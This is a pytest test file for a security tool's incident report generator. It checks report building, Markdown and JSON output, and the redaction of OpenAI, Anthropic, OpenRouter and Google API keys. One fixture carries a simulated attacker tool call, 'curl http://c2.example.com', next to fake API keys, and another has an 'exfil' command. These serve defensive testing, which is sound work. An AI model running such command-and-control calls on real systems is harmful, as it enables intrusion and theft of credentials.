"""
tests/test_report_generator.py — TDD unit tests for IncidentReportGenerator.

Written BEFORE implementation per strict TDD mandate.
Tests cover:
  - IncidentReport construction (FR-4)
  - Secret redaction via ContextResolver before embedding in report (FR-6)
  - Markdown formatting: expected headers and fields (FR-4)
  - JSON round-trip fidelity (FR-4)
  - UTC-aware timestamp in generated report
"""

import json
from datetime import datetime, timezone
from unittest.mock import MagicMock
from uuid import uuid4

import pytest

from blackwall.attribution.reporter import IncidentReportGenerator
from blackwall.models import (
    AttackerIdentity,
    AttackerProfile,
    IdentitySource,
    IncidentReport,
    ToolCallContext,
    VerdictDecision,
)


@pytest.fixture
def generator() -> IncidentReportGenerator:
    return IncidentReportGenerator()


@pytest.fixture
def sample_identity() -> AttackerIdentity:
    return AttackerIdentity(
        agent_id="agent-007",
        agent_name="InfiltratorAgent",
        thread_id="th-555",
        primary_source=IdentitySource.ADK_METADATA,
    )


@pytest.fixture
def sample_profile(sample_identity: AttackerIdentity) -> AttackerProfile:
    now = datetime.now(timezone.utc)
    return AttackerProfile(
        fingerprint=sample_identity.identity_fingerprint,
        first_seen=now,
        last_seen=now,
        total_attacks=3,
        threat_score=0.85,
        targeted_tools=["execute_bash"],
        risk_category="HIGH",
    )


@pytest.fixture
def clean_tool_context() -> ToolCallContext:
    return ToolCallContext(
        tool_name="execute_bash",
        arguments={"cmd": "whoami"},
        metadata=None,
    )


@pytest.fixture
def sensitive_tool_context() -> ToolCallContext:
    return ToolCallContext(
        tool_name="execute_bash",
        arguments={
            "OPENAI_API_KEY": "sk-supersecret1234",
            "cmd": "curl http://c2.example.com",
            "GOOGLE_API_KEY": "AIza_supersecret",
        },
        metadata=None,
    )


class TestIncidentReportConstruction:
    """FR-4: IncidentReport generation for BLOCK/QUARANTINE verdicts."""

    def test_build_returns_incident_report(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Operation blocked",
            recommended_action="Revoke agent token",
            confidence=0.90,
        )

        assert isinstance(report, IncidentReport)
        assert report.verdict == VerdictDecision.BLOCK
        assert report.exploited_tool == "execute_bash"
        assert report.attack_technique == "Command Injection"
        assert report.attribution_confidence == pytest.approx(0.90)

    def test_build_with_quarantine_verdict(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.QUARANTINE,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Lateral Movement Attempt",
            mitigation="Process quarantined",
            recommended_action="Inspect sandbox logs",
            confidence=0.75,
        )

        assert report.verdict == VerdictDecision.QUARANTINE

    def test_report_timestamp_is_utc_aware(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Exfiltration",
            mitigation="Blocked",
            recommended_action="Review logs",
            confidence=0.80,
        )

        assert report.timestamp.tzinfo is not None
        assert report.timestamp.utcoffset().total_seconds() == 0  # UTC

    def test_report_has_valid_uuid_report_id(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="SQL Injection",
            mitigation="Blocked",
            recommended_action="Patch query",
            confidence=0.95,
        )

        from uuid import UUID
        assert isinstance(report.report_id, UUID)


class TestSecretRedaction:
    """FR-6: Context Hygiene — sensitive arguments must be sanitized before embedding."""

    def test_api_key_in_arguments_is_redacted(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        sensitive_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=sensitive_tool_context,
            technique="Credential Harvesting",
            mitigation="Blocked",
            recommended_action="Rotate API keys",
            confidence=0.99,
        )

        sanitized = report.sanitized_arguments
        # Raw API key values must NOT appear in sanitized output
        assert "sk-supersecret1234" not in str(sanitized)
        assert "AIza_supersecret" not in str(sanitized)

    def test_sanitized_arguments_contains_placeholder(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        sensitive_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=sensitive_tool_context,
            technique="Credential Harvesting",
            mitigation="Blocked",
            recommended_action="Rotate API keys",
            confidence=0.99,
        )

        # Sanitized arguments should contain redaction placeholder markers
        sanitized_str = str(report.sanitized_arguments)
        assert "[[" in sanitized_str or "[REDACTED]" in sanitized_str or "REDACTED" in sanitized_str

    def test_clean_arguments_are_preserved(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Inspect logs",
            confidence=0.80,
        )

        # Safe arguments (no secrets) should survive sanitization
        assert report.sanitized_arguments.get("cmd") == "whoami"


class TestMarkdownFormatting:
    """FR-4: to_markdown() must produce properly formatted incident reports."""

    def test_markdown_contains_required_header(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        markdown = report.to_markdown()
        assert "# Blackwall Incident Attribution Report" in markdown

    def test_markdown_contains_attacker_name(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        markdown = report.to_markdown()
        assert "InfiltratorAgent" in markdown

    def test_markdown_contains_verdict(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        markdown = report.to_markdown()
        assert "BLOCK" in markdown

    def test_markdown_contains_exploited_tool(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        markdown = report.to_markdown()
        assert "execute_bash" in markdown


class TestJSONFormatting:
    """FR-4: to_json() must produce valid JSON with correct fields."""

    def test_json_is_valid_parseable_string(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        json_str = report.to_json()
        parsed = json.loads(json_str)
        assert isinstance(parsed, dict)

    def test_json_contains_agent_name(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        parsed = json.loads(report.to_json())
        assert parsed["attacker_identity"]["agent_name"] == "InfiltratorAgent"

    def test_json_contains_verdict(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
        clean_tool_context: ToolCallContext,
    ):
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=clean_tool_context,
            technique="Command Injection",
            mitigation="Blocked",
            recommended_action="Review agent",
            confidence=0.90,
        )

        parsed = json.loads(report.to_json())
        assert parsed["verdict"] == "BLOCK"


# ===========================================================================
# Property-Based Tests: Redaction Coverage (Greptile 3/5 → 5/5 fix)
# Validates that _sanitize_arguments() redacts all OpenAI key formats,
# including the sk-proj-... project-scoped format that bypassed the
# original regex.
# ===========================================================================

class TestRedactionRegression:
    """Regression tests for sk-proj-... and other multi-segment OpenAI key formats."""

    def test_sk_proj_format_is_redacted(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
    ):
        """sk-proj-... project-scoped OpenAI keys must be redacted (Greptile finding)."""
        proj_key_context = ToolCallContext(
            tool_name="execute_bash",
            arguments={"OPENAI_API_KEY": "sk-proj-abc123XYZdef456GHIjkl789"},
            metadata=None,
        )
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=proj_key_context,
            technique="Credential Harvesting",
            mitigation="Blocked",
            recommended_action="Rotate keys",
            confidence=0.99,
        )
        assert "sk-proj-abc123XYZdef456GHIjkl789" not in str(report.sanitized_arguments)
        assert "sk-proj-abc123XYZdef456GHIjkl789" not in report.to_json()

    def test_sk_ant_format_is_redacted(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
    ):
        """sk-ant-... Anthropic keys must also be redacted."""
        ant_key_context = ToolCallContext(
            tool_name="execute_bash",
            arguments={"cmd": "exfil", "api_key": "sk-ant-api03-superSecret12345"},
            metadata=None,
        )
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=ant_key_context,
            technique="Exfiltration",
            mitigation="Blocked",
            recommended_action="Rotate keys",
            confidence=0.95,
        )
        assert "sk-ant-api03-superSecret12345" not in str(report.sanitized_arguments)

    def test_sk_or_v1_format_is_redacted(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
    ):
        """sk-or-v1-... OpenRouter keys must be redacted."""
        or_key_context = ToolCallContext(
            tool_name="query_db",
            arguments={"OPENROUTER_API_KEY": "sk-or-v1-longSecretValue12345678"},
            metadata=None,
        )
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.QUARANTINE,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=or_key_context,
            technique="Lateral Movement",
            mitigation="Quarantined",
            recommended_action="Inspect config",
            confidence=0.80,
        )
        assert "sk-or-v1-longSecretValue12345678" not in str(report.sanitized_arguments)

    def test_nested_secret_not_in_json_output(
        self,
        generator: IncidentReportGenerator,
        sample_identity: AttackerIdentity,
        sample_profile: AttackerProfile,
    ):
        """Secrets must not appear in the full JSON serialization of the report."""
        secret = "sk-proj-TestSecret-abcde12345"
        ctx = ToolCallContext(
            tool_name="execute_bash",
            arguments={"key": secret},
            metadata=None,
        )
        report = generator.build(
            event_id=uuid4(),
            verdict=VerdictDecision.BLOCK,
            identity=sample_identity,
            profile=sample_profile,
            tool_context=ctx,
            technique="Key Theft",
            mitigation="Blocked",
            recommended_action="Rotate",
            confidence=0.99,
        )
        assert secret not in report.to_json()
        assert secret not in report.to_markdown()


try:
    from hypothesis import given, settings
    from hypothesis import strategies as st

    class TestRedactionPropertyBased:
        """
        Property-based tests verifying redaction holds for arbitrary API key strings.
        Covers the class of inputs that bypass point-in-time example tests.
        """

        @given(
            suffix=st.text(
                alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                min_size=10,
                max_size=40,
            )
        )
        @settings(max_examples=30, deadline=2000)
        def test_simple_sk_key_always_redacted(self, suffix: str):
            """Any sk-<alphanum10+> credential must be stripped from sanitized arguments."""
            from blackwall.attribution.reporter import _sanitize_arguments

            key = f"sk-{suffix}"
            result = _sanitize_arguments({"secret": key})
            assert key not in str(result), f"sk- key not redacted: {key!r}"

        @given(
            segment1=st.text(
                alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                min_size=3, max_size=15,
            ),
            segment2=st.text(
                alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                min_size=8, max_size=30,
            ),
        )
        @settings(max_examples=30, deadline=2000)
        def test_sk_proj_format_always_redacted(self, segment1: str, segment2: str):
            """Any sk-<seg>-<alphanum8+> project-scoped credential must be redacted."""
            from blackwall.attribution.reporter import _sanitize_arguments

            key = f"sk-{segment1}-{segment2}"
            result = _sanitize_arguments({"OPENAI_API_KEY": key})
            assert key not in str(result), f"sk-proj key not redacted: {key!r}"

        @given(
            suffix=st.text(
                alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-",
                min_size=10,
                max_size=40,
            )
        )
        @settings(max_examples=30, deadline=2000)
        def test_google_aiza_key_always_redacted(self, suffix: str):
            """Any AIza<10+char> Google key must be stripped from sanitized arguments."""
            from blackwall.attribution.reporter import _sanitize_arguments

            key = f"AIza{suffix}"
            result = _sanitize_arguments({"GOOGLE_API_KEY": key})
            assert key not in str(result), f"Google key not redacted: {key!r}"

except ImportError:
    pass  # hypothesis not installed — property tests skipped gracefully
